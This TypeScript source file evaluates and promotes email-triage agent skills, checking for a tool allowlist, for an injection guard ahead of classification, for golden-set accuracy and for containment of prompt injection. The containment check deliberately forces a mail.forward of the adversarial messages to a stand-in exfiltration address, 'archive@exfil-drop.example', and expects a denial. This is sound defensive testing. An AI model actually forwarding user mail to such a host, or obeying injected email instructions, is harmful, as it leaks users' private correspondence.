// Skill evaluation pipeline. Promotion happens only if every mandatory check passes; the pass rate
// is computed from the checks actually executed. Model-assisted steps run with the demo stand-in
// here (no inference, drafts are not graded) so evaluation is deterministic and free.
import crypto from "node:crypto";
import { db, id, nowIso } from "./db.ts";
import { GOLDEN_SET, INBOX_DAYS, type Category, type Email } from "./fixtures.ts";
import { canonical } from "./policy.ts";
import { sign } from "./signing.ts";
import { ManifestSchema, executeSkill, getSkill, setSkillState, tierOf, type Manifest, type Skill } from "./skills.ts";
import { TOOLS, invokeTool, newState, type ExecState } from "./tools.ts";

export type Check = {
  id: string;
  title: string;
  mandatory: boolean;
  passed: boolean;
  detail: string;
  metric?: { value: number; threshold: number };
  cases?: { input: string; expected: string; actual: string; passed: boolean }[];
};

export type EvalReport = {
  skillId: string;
  family: string;
  version: number;
  manifestSha256: string;
  startedAt: string;
  durationMs: number;
  checks: Check[];
  passed: number;
  total: number;
  passRate: number;
  promoted: boolean;
  outcome: string;
  notes: string[];
};

async function run(m: Manifest, label: string, emails: Email[]): Promise<ExecState & { ok: boolean; failures: string[] }> {
  const s = newState(`eval:${label}`, 1, false);
  s.fixtureInbox = { label, emails };
  const r = await executeSkill({ manifest: m }, s, "evaluation");
  return Object.assign(s, { ok: r.ok, failures: r.invariantFailures });
}

const labelOf = (s: ExecState, emailId: string): Category | "missing" => s.items?.find((i) => i.id === emailId)?.category ?? "missing";

export async function evaluateManifest(rawManifest: unknown, skillId = "adhoc"): Promise<EvalReport> {
  const started = Date.now();
  const checks: Check[] = [];
  const notes: string[] = [];
  const add = (c: Check) => checks.push(c);

  // 1. Schema
  const parsed = ManifestSchema.safeParse(rawManifest);
  add({ id: "schema", title: "Manifest matches the skill schema", mandatory: true, passed: parsed.success,
    detail: parsed.success ? "Valid against ManifestSchema v1." : parsed.error.issues.slice(0, 4).map((i) => `${i.path.join(".")}: ${i.message}`).join("; ") });
  const m = parsed.success ? parsed.data : null;
  const steps = (rawManifest as { steps?: { tool?: unknown; args?: unknown }[] })?.steps ?? [];

  // 2. Allowlist + argument validation, independent of the schema check so tampering is reported precisely.
  const stepIssues: string[] = [];
  for (const [i, st] of steps.entries()) {
    const def = typeof st?.tool === "string" && Object.hasOwn(TOOLS, st.tool) ? TOOLS[st.tool] : null;
    if (!def) { stepIssues.push(`step ${i + 1}: "${String(st?.tool)}" is not an allowlisted tool`); continue; }
    if (def.risk === "irreversible") stepIssues.push(`step ${i + 1}: ${def.name} is irreversible — skills may only read or draft locally`);
    const a = def.args.safeParse(st.args ?? {});
    if (!a.success) stepIssues.push(`step ${i + 1}: ${def.name} arguments invalid (${a.error.issues[0]?.message})`);
  }
  add({ id: "allowlist", title: "Only allowlisted, non-privileged operations with valid arguments", mandatory: true, passed: steps.length > 0 && stepIssues.length === 0,
    detail: stepIssues.length ? stepIssues.join("; ") : `${steps.length} steps, all allowlisted and read/local risk.` });

  // 3. Preconditions: ordering of required guard.
  const tools = steps.map((s) => s?.tool);
  const guardAt = tools.indexOf("guard.injection_scan");
  const classifyAt = tools.findIndex((t) => t === "triage.rules" || t === "triage.llm");
  const orderOk = tools[0] === "inbox.list" && guardAt > 0 && classifyAt > guardAt;
  add({ id: "preconditions", title: "Inbox loaded first; injection guard runs before classification", mandatory: true, passed: orderOk,
    detail: orderOk ? "inbox.list → guard.injection_scan → classification." : `Step order was: ${tools.join(" → ")}` });

  if (!m || stepIssues.length || !orderOk) {
    notes.push("Behavioural checks skipped: the manifest is not safe to execute.");
    return finish();
  }

  // 4. Trace replay agreement
  const byDay = new Map<number, Manifest["fixtures"]["traceExamples"]>();
  for (const ex of m.fixtures.traceExamples) byDay.set(ex.day, [...(byDay.get(ex.day) ?? []), ex]);
  const traceCases: NonNullable<Check["cases"]> = [];
  for (const [day, exs] of byDay) {
    const emails = (INBOX_DAYS[day] ?? []).filter((e) => exs.some((x) => x.emailId === e.id));
    const s = await run(m, `trace-day-${day}`, emails);
    for (const ex of exs) {
      const got = labelOf(s, ex.emailId);
      traceCases.push({ input: `${ex.emailId}: ${emails.find((e) => e.id === ex.emailId)?.subject ?? "?"}`, expected: ex.expected, actual: got, passed: got === ex.expected });
    }
  }
  const agree = traceCases.filter((c) => c.passed).length / Math.max(traceCases.length, 1);
  add({ id: "trace-replay", title: "Reproduces the Apprentice's labels on the recorded traces", mandatory: true, passed: agree >= m.acceptance.minTraceAgreement,
    metric: { value: agree, threshold: m.acceptance.minTraceAgreement }, cases: traceCases,
    detail: `${traceCases.filter((c) => c.passed).length}/${traceCases.length} labels match the recorded runs.` });

  // 5. Held-out golden set
  const g = await run(m, "golden-v1", GOLDEN_SET);
  const goldCases = GOLDEN_SET.map((e) => {
    const got = labelOf(g, e.id);
    return { input: `${e.id}: ${e.subject}`, expected: e.ref.category, actual: got, passed: got === e.ref.category };
  });
  const acc = goldCases.filter((c) => c.passed).length / goldCases.length;
  add({ id: "golden-accuracy", title: "Accuracy on the held-out golden set (human reference labels)", mandatory: true, passed: acc >= m.acceptance.minGoldenAccuracy,
    metric: { value: acc, threshold: m.acceptance.minGoldenAccuracy }, cases: goldCases, detail: `${goldCases.filter((c) => c.passed).length}/${goldCases.length} correct.` });
  for (const cat of ["urgent", "suspicious"] as const) {
    const rel = goldCases.filter((c) => c.expected === cat);
    const recall = rel.filter((c) => c.passed).length / Math.max(rel.length, 1);
    add({ id: `${cat}-recall`, title: `Every ${cat} message in the golden set is caught`, mandatory: true, passed: recall >= 1,
      metric: { value: recall, threshold: 1 }, cases: rel, detail: `${rel.filter((c) => c.passed).length}/${rel.length} ${cat} messages identified.` });
  }

  // 6. Injection containment: run on adversarial inputs and inspect every policy decision taken.
  const adversarial = [...GOLDEN_SET.filter((e) => e.ref.category === "suspicious"), ...Object.values(INBOX_DAYS).flat().filter((e) => e.ref.category === "suspicious")];
  const adv = await run(m, "adversarial", adversarial);
  const expanded = adv.trace.filter((t) => t.kind === "policy" || (t.kind === "tool" && !m.steps.some((st) => st.tool === t.name)));
  const leaked = (adv.items ?? []).filter((i) => i.category !== "suspicious" || i.reply);
  const probe = await invokeTool(adv, "mail.forward", { to: "archive@exfil-drop.example", messageIds: adversarial.map((e) => e.id) }, { kind: "skill", taint: adv.taint }, undefined, "evaluation");
  const containOk = expanded.length === 0 && leaked.length === 0 && probe.decision.decision === "deny";
  add({ id: "injection-containment", title: "Malicious content cannot expand the skill's permissions", mandatory: true, passed: containOk,
    detail: containOk
      ? `${adversarial.length} injection emails: all quarantined, no reply drafted, no operation outside the manifest ran; a forced mail.forward from skill context was denied (${probe.decision.rule}).`
      : [expanded.length ? `unexpected operations: ${expanded.map((t) => t.name).join(", ")}` : "", leaked.length ? `not quarantined: ${leaked.map((i) => i.id).join(", ")}` : "", probe.decision.decision !== "deny" ? `forced forward was ${probe.decision.decision}` : ""].filter(Boolean).join("; ") });

  // 7. Runtime invariants on every replay
  const allRuns = [g, adv];
  const invFails = [...allRuns.flatMap((r) => r.failures.filter((f) => !f.includes("matched a learned rule")))];
  add({ id: "invariants", title: "Output invariants hold (one label each, no replies to suspicious mail, urgent items in digest)", mandatory: true, passed: invFails.length === 0,
    detail: invFails.length ? invFails.join("; ") : "All invariants held on golden and adversarial replays." });

  // 7b. Regressions: inboxes on which a previous version of this task family failed at run time.
  const regressionDays = (db().prepare("SELECT DISTINCT workspace_day AS d FROM tasks WHERE intent_key = ? AND fallback_reason LIKE '%failed at run time%' ORDER BY d").all(m.family) as { d: number }[]).map((r) => r.d);
  if (regressionDays.length) {
    const cases: NonNullable<Check["cases"]> = [];
    for (const day of regressionDays) {
      const r = await run(m, `regression-day-${day}`, INBOX_DAYS[day] ?? []);
      cases.push({ input: `Day ${day} inbox (previously broke this task)`, expected: "all runtime invariants hold", actual: r.ok ? "held" : r.failures.join(" "), passed: r.ok });
    }
    add({ id: "regressions", title: "Inboxes that previously broke this skill now pass the runtime invariants", mandatory: true, passed: cases.every((c) => c.passed), cases,
      detail: `${cases.filter((c) => c.passed).length}/${cases.length} recorded runtime failures replayed cleanly.` });
  }

  // 8. Determinism (Master only)
  if (tierOf(m) === "master") {
    const again = await run(m, "golden-v1", GOLDEN_SET);
    const h = (s: ExecState) => crypto.createHash("sha256").update(canonical({ items: s.items, digest: s.digest })).digest("hex");
    add({ id: "determinism", title: "Identical output on identical input", mandatory: true, passed: h(g) === h(again), detail: `Output hash ${h(g).slice(0, 12)}… on both runs.` });
  } else {
    notes.push("Journeyman skill: draft.llm ran with the demo stand-in during evaluation; reply wording is not graded, only classification and safety.");
  }
  return finish();

  function finish(): EvalReport {
    const passed = checks.filter((c) => c.passed).length;
    const promoted = checks.length > 0 && checks.filter((c) => c.mandatory).every((c) => c.passed);
    const failed = checks.filter((c) => c.mandatory && !c.passed).map((c) => c.title);
    return {
      skillId,
      family: m?.family ?? "invalid",
      version: m?.version ?? 0,
      manifestSha256: crypto.createHash("sha256").update(canonical(rawManifest)).digest("hex"),
      startedAt: new Date(started).toISOString(),
      durationMs: Date.now() - started,
      checks,
      passed,
      total: checks.length,
      passRate: checks.length ? passed / checks.length : 0,
      promoted,
      outcome: promoted ? "All mandatory checks passed. The skill is promoted." : `This skill failed verification. It has not been promoted. Failed: ${failed.join("; ")}.`,
      notes,
    };
  }
}

/** Evaluate a stored skill version and apply the lifecycle outcome. */
export async function evaluateSkill(skillId: string): Promise<{ skill: Skill; report: EvalReport }> {
  const skill = getSkill(skillId);
  if (!skill) throw new Error("Skill not found.");
  if (skill.state === "superseded") throw new Error("Superseded versions are kept for history and cannot be re-evaluated.");
  const report = await evaluateManifest(skill.manifest, skill.id);
  const evalId = id("evl");
  db().prepare("INSERT INTO evaluations(id, skill_id, created_at, passed, pass_rate, report_json) VALUES(?, ?, ?, ?, ?, ?)")
    .run(evalId, skill.id, nowIso(), report.promoted ? 1 : 0, report.passRate, JSON.stringify(report));
  if (report.promoted) {
    const signature = sign(skill.manifest, report);
    db().prepare("UPDATE skills SET state = 'superseded', state_reason = ?, updated_at = ? WHERE family = ? AND state = 'verified' AND id != ?")
      .run(`Superseded by v${skill.version}.`, nowIso(), skill.family, skill.id);
    db().prepare("UPDATE skills SET state = 'verified', eval_id = ?, signature = ?, state_reason = ?, updated_at = ? WHERE id = ?")
      .run(evalId, signature, `Passed ${report.passed}/${report.total} checks.`, nowIso(), skill.id);
  } else {
    db().prepare("UPDATE skills SET eval_id = ?, signature = NULL, updated_at = ? WHERE id = ?").run(evalId, nowIso(), skill.id);
    setSkillState(skill.id, skill.state === "candidate" || skill.state === "rejected" ? "rejected" : "demoted", report.outcome);
  }
  return { skill: getSkill(skill.id)!, report };
}

export function listEvaluations(skillId: string): { id: string; createdAt: string; passed: boolean; passRate: number; report: EvalReport }[] {
  return (db().prepare("SELECT * FROM evaluations WHERE skill_id = ? ORDER BY created_at DESC").all(skillId) as Record<string, unknown>[]).map((r) => ({
    id: r.id as string, createdAt: r.created_at as string, passed: r.passed === 1, passRate: r.pass_rate as number, report: JSON.parse(r.report_json as string) as EvalReport,
  }));
}
